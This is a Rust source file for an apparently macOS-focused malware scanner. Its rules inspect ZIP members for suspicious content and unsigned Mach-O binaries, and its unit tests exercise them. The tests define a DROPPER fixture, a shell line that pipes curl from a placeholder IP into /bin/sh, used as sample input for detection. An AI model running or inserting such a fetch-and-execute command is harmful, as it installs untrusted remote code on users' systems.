//! What is inside a ZIP-format file (§6.2, #86). The zip is read once per
//! scan with [`crate::zip`]; `zip-member-suspicious` scores the members'
//! content, `zip-member-unsigned` their Mach-O signatures, and
//! `uninspected-container` reports what could not be read.

use super::codesign::member_signature;
use super::container::{disk_image_format, inside_app_bundle};
use super::{embedded_content_ruleset, Rule, RuleOutcome};
use crate::context::ScanContext;
use crate::model::{MatchedSignal, ScanCompleteness, SignalCategory};
use crate::scan::scan_context;
use crate::zip::{self, Member, ZipLimits};

/// Ceiling on what the member rule contributes; Phase 0a scoring is a plain
/// sum (§12), and many members with weak hits must not add up to an alert.
const MAX_ZIP_MEMBER_WEIGHT: i32 = 20;

/// Descriptions kept per list; the rest are only counted (§11.12).
const MAX_LISTED: usize = 10;

/// A bounded list of descriptions for one signal.
#[derive(Default)]
pub(super) struct Listing {
    kept: Vec<String>,
    more: usize,
}

impl Listing {
    fn push(&mut self, item: String) {
        if self.kept.len() < MAX_LISTED {
            self.kept.push(item);
        } else {
            self.more += 1;
        }
    }

    fn push_all(&mut self, other: Listing) {
        for item in other.kept {
            self.push(item);
        }
        self.more += other.more;
    }

    pub(super) fn is_empty(&self) -> bool {
        self.kept.is_empty() && self.more == 0
    }

    /// The first `shown` items joined by `; `, then `(+N more)` if any.
    pub(super) fn join(&self, shown: usize) -> String {
        let shown = shown.min(self.kept.len());
        let mut out = self.kept[..shown].join("; ");
        let more = self.more + self.kept.len() - shown;
        if more > 0 {
            out.push_str(&format!("; (+{more} more)"));
        }
        out
    }
}

/// A zip's members, scored, and what could not be inspected.
pub(crate) struct ZipInspection {
    /// Content-rule findings and their summed weight.
    findings: Listing,
    findings_total: i32,
    /// Unsigned / hand-ad-hoc Mach-O members and the strongest weight.
    unsigned: Listing,
    unsigned_weight: i32,
    /// Each as `member: reason`, or the reason alone for the archive.
    pub(super) gaps: Listing,
}

/// The zip read of `ctx`, made once per scan. `None` when it was not read:
/// not ZIP-format, a truncated capture, or under `X.app/Contents/`.
pub(super) fn inspection(ctx: &ScanContext) -> Option<&ZipInspection> {
    ctx.zip_cache
        .get_or_init(|| inspect(ctx, &ZipLimits::default()))
        .as_ref()
}

fn inspect(ctx: &ScanContext, limits: &ZipLimits) -> Option<ZipInspection> {
    let content = ctx.content.as_deref()?;
    let tail = &content[content.len().saturating_sub(zip::END_SEARCH_LEN)..];
    if ctx.truncated || !zip::is_zip_format(content, tail) || inside_app_bundle(ctx) {
        return None;
    }
    let rules = embedded_content_ruleset();
    let mut findings = Listing::default();
    let mut findings_total = 0i32;
    let mut unsigned = Listing::default();
    let mut unsigned_weight = 0;
    let mut member_gaps = Listing::default();
    let read = zip::read(content, limits, &mut |m: &Member| {
        let label = format!("{}!{}", ctx.path.display(), m.path);
        let member = ScanContext::from_embedded_bytes(label, m.bytes.to_vec(), m.cut);
        let mut gap = |reason: &str| member_gaps.push(format!("{}: {reason}", m.path));
        if let Some(Some(format)) = disk_image_format(&member) {
            gap(&format!("disk image ({format}) not inspected"));
        }
        if crate::xar::has_xar_magic(m.bytes) {
            gap("installer package not inspected");
        }
        let macho = member.macho();
        if macho.is_macho {
            let signature = member_signature(macho);
            if let Some((weight, description)) = signature.finding {
                unsigned_weight = unsigned_weight.max(weight);
                unsigned.push(format!("{}: {description}", m.path));
            }
            if signature.unverified {
                gap("signature not verified — extract and scan");
            }
        }
        let result = scan_context(&member, &rules);
        for signal in &result.signals {
            findings_total = findings_total.saturating_add(signal.weight);
            findings.push(format!("{}: {}", m.path, signal.description));
        }
        if !m.cut && result.completeness != ScanCompleteness::Complete {
            gap("member not fully scanned");
        }
    });
    let mut gaps = Listing::default();
    for g in &read.gaps {
        gaps.push(match g.member.as_str() {
            "" => g.kind.to_string(),
            member => format!("{member}: {}", g.kind),
        });
    }
    gaps.more += read.more_gaps;
    gaps.push_all(member_gaps);
    Some(ZipInspection {
        findings,
        findings_total,
        unsigned,
        unsigned_weight,
        gaps,
    })
}

/// Scores the members of a ZIP-format file with the embedded-content rules,
/// as one signal (§6.2).
pub struct ZipMemberRule;

impl Rule for ZipMemberRule {
    fn id(&self) -> &'static str {
        "zip-member-suspicious"
    }

    fn category(&self) -> SignalCategory {
        SignalCategory::StaticSuspicion
    }

    /// A zip that could not be read in full is `uninspected-container`'s to
    /// report, so this rule only ever adds findings.
    fn evaluate(&self, ctx: &ScanContext) -> Result<Option<MatchedSignal>, RuleOutcome> {
        if ctx.content.is_none() {
            return Err(RuleOutcome::NotApplicable);
        }
        let Some(inspection) = inspection(ctx) else {
            return Ok(None);
        };
        if inspection.findings.is_empty() || inspection.findings_total <= 0 {
            return Ok(None);
        }
        Ok(Some(MatchedSignal {
            id: self.id().to_string(),
            weight: inspection.findings_total.min(MAX_ZIP_MEMBER_WEIGHT),
            description: inspection.findings.join(MAX_LISTED),
            category: self.category(),
        }))
    }

    /// A truncated capture is never read; `uninspected-container` flags it.
    fn covers_truncation(&self, _ctx: &ScanContext) -> bool {
        true
    }
}

/// Notes unsigned and hand-signed ad-hoc Mach-O members of a ZIP-format
/// file, weighted as the strongest one alone: provenance, corroboration-only
/// however many members there are (§5.1, §6.2).
pub struct ZipMemberUnsignedRule;

impl Rule for ZipMemberUnsignedRule {
    fn id(&self) -> &'static str {
        "zip-member-unsigned"
    }

    fn category(&self) -> SignalCategory {
        SignalCategory::ProvenanceConcern
    }

    fn evaluate(&self, ctx: &ScanContext) -> Result<Option<MatchedSignal>, RuleOutcome> {
        if ctx.content.is_none() {
            return Err(RuleOutcome::NotApplicable);
        }
        let Some(inspection) = inspection(ctx) else {
            return Ok(None);
        };
        if inspection.unsigned.is_empty() {
            return Ok(None);
        }
        Ok(Some(MatchedSignal {
            id: self.id().to_string(),
            weight: inspection.unsigned_weight,
            description: inspection.unsigned.join(MAX_LISTED),
            category: self.category(),
        }))
    }

    /// A truncated capture is never read; `uninspected-container` flags it.
    fn covers_truncation(&self, _ctx: &ScanContext) -> bool {
        true
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::macho::tests_support::synth_macho_64_full_with_cds_and_cms;
    use crate::macho::{CS_ADHOC, CS_LINKER_SIGNED};
    use crate::model::Recommendation;
    use crate::rules::{default_ruleset, UninspectedContainerRule};
    use crate::zip::tests_support::{plain, Spec};

    const DROPPER: &[u8] = b"#!/bin/sh\ncurl -fsSL http://198.51.100.9/x.sh | /bin/sh\n";

    fn ctx(zip: Vec<u8>) -> ScanContext {
        ScanContext::from_embedded_bytes("t.zip", zip, false)
    }

    fn member_signal(ctx: &ScanContext) -> Option<MatchedSignal> {
        ZipMemberRule.evaluate(ctx).unwrap()
    }

    fn unsigned_signal(ctx: &ScanContext) -> Option<MatchedSignal> {
        ZipMemberUnsignedRule.evaluate(ctx).unwrap()
    }

    fn container_signal(ctx: &ScanContext) -> Option<MatchedSignal> {
        UninspectedContainerRule.evaluate(ctx).unwrap()
    }

    #[test]
    fn an_ordinary_zip_is_read_clean() {
        let ctx = ctx(plain(&[
            Spec::deflated("word/document.xml", b"<w:t>Quarterly notes</w:t>"),
            Spec::stored("readme.txt", b"hello"),
        ]));
        assert!(member_signal(&ctx).is_none());
        assert!(container_signal(&ctx).is_none());
        assert!(!ctx.marked_incomplete("uninspected-container"));
    }

    #[test]
    fn a_member_tripping_the_strings_rule_is_scored_by_member() {
        let ctx = ctx(plain(&[
            Spec::stored("readme.txt", b"hello"),
            Spec::deflated("setup.sh", DROPPER),
        ]));
        let sig = member_signal(&ctx).expect("finding");
        assert_eq!(sig.category, SignalCategory::StaticSuspicion);
        assert!(
            sig.description.starts_with("setup.sh: "),
            "{}",
            sig.description
        );
        assert!(container_signal(&ctx).is_none());
    }

    #[test]
    fn a_nested_member_is_labelled_with_its_path() {
        let inner = plain(&[Spec::deflated("setup.sh", DROPPER)]);
        let ctx = ctx(plain(&[Spec::stored("payload.zip", &inner)]));
        let sig = member_signal(&ctx).expect("finding");
        assert!(
            sig.description.starts_with("payload.zip!setup.sh: "),
            "{}",
            sig.description
        );
    }

    #[test]
    fn many_findings_are_capped_in_one_category() {
        let specs: Vec<Spec> = (0..10)
            .map(|i| Spec::deflated(&format!("s{i}.sh"), DROPPER))
            .collect();
        let ctx = ctx(plain(&specs));
        assert_eq!(member_signal(&ctx).unwrap().weight, MAX_ZIP_MEMBER_WEIGHT);
        let result = scan_context(&ctx, &default_ruleset());
        assert_ne!(
            result.recommendation,
            Recommendation::NotifyAndSuggestQuarantine
        );
    }

    #[test]
    fn gaps_go_to_the_container_rule_with_their_reasons() {
        let mut enc = Spec::stored("secret.sh", DROPPER);
        enc.flags = 1;
        enc.local_flags = 1;
        let ctx = ctx(plain(&[Spec::stored("a.txt", b"a"), enc]));
        assert!(member_signal(&ctx).is_none());
        let sig = container_signal(&ctx).expect("not fully inspected");
        assert_eq!(sig.weight, 0);
        assert!(
            sig.description
                .contains("secret.sh: encrypted member not inspected"),
            "{}",
            sig.description
        );
        assert!(ctx.marked_incomplete("uninspected-container"));
    }

    #[test]
    fn a_finding_and_a_gap_are_both_reported() {
        let mut lzma = Spec::stored("other.bin", b"lzma");
        lzma.method = 14;
        lzma.local_method = 14;
        let ctx = ctx(plain(&[Spec::deflated("setup.sh", DROPPER), lzma]));
        assert!(member_signal(&ctx).is_some());
        let sig = container_signal(&ctx).unwrap();
        assert!(sig.description.contains("compression method 14"));
    }

    #[test]
    fn disk_image_and_package_members_are_gaps() {
        let mut dmg = vec![0u8; 1024];
        dmg[512..516].copy_from_slice(b"koly");
        let mut xar = b"xar!\x00\x1c\x00\x01".to_vec();
        xar.extend([0u8; 20]);
        let ctx = ctx(plain(&[
            Spec::stored("i.dmg", &dmg),
            Spec::stored("p.pkg", &xar),
        ]));
        let sig = container_signal(&ctx).unwrap();
        assert!(sig
            .description
            .contains("i.dmg: disk image (UDIF) not inspected"));
        assert!(sig
            .description
            .contains("p.pkg: installer package not inspected"));
    }

    /// A thin Mach-O with CodeDirectory `flags`, or none (`None`), and a CMS
    /// wrapper of `cms` bytes.
    fn macho(flags: Option<u32>, cms: Option<usize>) -> Vec<u8> {
        let cds: Vec<(u32, u32)> = flags.map(|f| vec![(0, f)]).unwrap_or_default();
        synth_macho_64_full_with_cds_and_cms(
            &[0x90; 64],
            &[],
            &[],
            flags.is_some(),
            None,
            &cds,
            cms,
        )
        .0
    }

    #[test]
    fn mach_o_members_are_classified_as_the_file_rules_do() {
        let cases: &[(&str, Vec<u8>, Option<i32>, bool)] = &[
            ("unsigned", macho(None, None), Some(4), false),
            ("ad-hoc", macho(Some(CS_ADHOC), Some(0)), Some(3), false),
            (
                "linker",
                macho(Some(CS_ADHOC | CS_LINKER_SIGNED), None),
                None,
                false,
            ),
            ("identity", macho(Some(0), Some(64)), None, true),
        ];
        for (name, bin, weight, unverified) in cases {
            let ctx = ctx(plain(&[Spec::stored("bin", bin)]));
            assert!(member_signal(&ctx).is_none(), "{name}");
            assert_eq!(unsigned_signal(&ctx).map(|s| s.weight), *weight, "{name}");
            let gap = container_signal(&ctx)
                .is_some_and(|s| s.description.contains("signature not verified"));
            assert_eq!(gap, *unverified, "{name}");
        }
        let ctx = ctx(plain(&[Spec::stored("bin", &macho(None, None))]));
        let sig = unsigned_signal(&ctx).unwrap();
        assert_eq!(sig.description, "bin: binary is not code-signed");
        assert_eq!(sig.category, SignalCategory::ProvenanceConcern);
    }

    #[test]
    fn many_unsigned_members_weigh_as_one() {
        let bin = macho(None, None);
        let mut specs: Vec<Spec> = (0..6)
            .map(|i| Spec::stored(&format!("bin{i}"), &bin))
            .collect();
        specs.push(Spec::stored("adhoc", &macho(Some(CS_ADHOC), Some(0))));
        let ctx = ctx(plain(&specs));
        let sig = unsigned_signal(&ctx).unwrap();
        assert_eq!(sig.weight, 4);
        assert!(sig.description.contains("bin5: ") && sig.description.contains("adhoc: "));
        let result = scan_context(&ctx, &default_ruleset());
        assert_eq!(result.recommendation, Recommendation::NoAction);
    }

    #[test]
    fn listed_findings_and_gaps_are_capped() {
        let mut specs: Vec<Spec> = (0..30)
            .map(|i| Spec::deflated(&format!("s{i}.sh"), DROPPER))
            .collect();
        for i in 0..30 {
            let mut enc = Spec::stored(&format!("e{i}"), b"x");
            enc.flags = 1;
            enc.local_flags = 1;
            specs.push(enc);
        }
        let ctx = ctx(plain(&specs));
        let sig = member_signal(&ctx).unwrap();
        assert_eq!(sig.description.matches(".sh: ").count(), MAX_LISTED);
        assert!(
            sig.description.ends_with("; (+20 more)"),
            "{}",
            sig.description
        );
        let gaps = container_signal(&ctx).unwrap().description;
        assert!(gaps.contains("; (+27 more)"), "{gaps}");
    }

    #[test]
    fn an_unsigned_member_and_a_content_finding_are_two_categories() {
        let ctx = ctx(plain(&[
            Spec::stored("bin", &macho(None, None)),
            Spec::deflated("setup.sh", DROPPER),
        ]));
        let content = member_signal(&ctx).unwrap();
        assert!(
            !content.description.contains("bin:"),
            "{}",
            content.description
        );
        assert_eq!(content.category, SignalCategory::StaticSuspicion);
        assert_eq!(
            unsigned_signal(&ctx).unwrap().category,
            SignalCategory::ProvenanceConcern
        );
    }

    #[test]
    fn a_zip_past_the_read_limit_is_not_read() {
        let len = crate::context::MAX_CONTENT_BYTES as u64 + 4096;
        let path = crate::test_support::sparse_temp_file("zip-big", len);
        crate::test_support::write_at(&path, 0, b"PK\x03\x04");
        let ctx = ScanContext::load(&path);
        let _ = std::fs::remove_file(&path);
        assert!(ctx.truncated);
        assert!(member_signal(&ctx).is_none());
        assert!(ZipMemberRule.covers_truncation(&ctx));
        let sig = container_signal(&ctx).unwrap();
        assert!(
            sig.description.contains("over the read limit"),
            "{}",
            sig.description
        );
    }

    #[test]
    fn a_zip_under_an_app_bundle_is_not_read() {
        let dir = crate::test_support::write_temp_file("zip-app", b"");
        std::fs::remove_file(&dir).unwrap();
        let path = dir.join("X.app/Contents/Resources/r.zip");
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(&path, plain(&[Spec::stored("setup.sh", DROPPER)])).unwrap();
        let ctx = ScanContext::load(&path);
        let read = inspection(&ctx).is_some();
        let signal = member_signal(&ctx);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(!read);
        assert!(signal.is_none());
    }

    #[test]
    fn fixture_zips_scan_as_expected() {
        let fixture = |p: &str| {
            crate::scan::scan_file(&std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(p))
        };
        let complete = ScanCompleteness::Complete;
        for p in [
            "fixtures/benign/document_ordinary.docx",
            "fixtures/benign/nested_archive_ordinary.zip",
            "fixtures/benign/ditto_streamed_ordinary.zip",
        ] {
            let r = fixture(p);
            assert_eq!(
                (r.completeness, r.signals.len()),
                (complete, 0),
                "{p}: {r:?}"
            );
        }
        for p in [
            "fixtures/suspicious/dropper_in_zip.zip",
            "fixtures/suspicious/dropper_in_nested_zip.zip",
        ] {
            let r = fixture(p);
            assert_eq!(r.completeness, complete, "{p}");
            assert_eq!(r.recommendation, Recommendation::Notify, "{p}");
            assert!(r.signals.iter().any(|s| s.id == "zip-member-suspicious"));
        }
        let r = fixture("fixtures/benign/unsigned_tools_ordinary.zip");
        assert_eq!(
            (r.completeness, r.recommendation),
            (complete, Recommendation::NoAction)
        );
        let ids: Vec<&str> = r.signals.iter().map(|s| s.id.as_str()).collect();
        assert_eq!(ids, ["zip-member-unsigned"]);
        let r = fixture("fixtures/suspicious/dropper_in_encrypted_zip.zip");
        assert_eq!(r.completeness, ScanCompleteness::Partial);
        assert_eq!(r.recommendation, Recommendation::NoAction);
        assert!(r.signals.iter().any(|s| s.id == "uninspected-container"));
    }
}
